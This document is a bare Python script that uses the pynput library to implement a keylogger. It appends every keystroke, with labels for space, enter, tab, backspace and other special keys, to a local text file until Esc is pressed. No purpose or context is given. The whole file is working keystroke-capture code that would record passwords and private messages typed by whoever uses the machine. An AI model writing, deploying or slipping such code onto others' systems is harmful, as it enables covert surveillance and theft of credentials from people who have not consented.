from pynput import keyboard

# File where logs will be saved
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            # Handle special keys
            if key == keyboard.Key.space:
                f.write(" [SPACE] ")
            elif key == keyboard.Key.enter:
                f.write(" [ENTER]\n")
            elif key == keyboard.Key.tab:
                f.write(" [TAB] ")
            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            else:
                f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
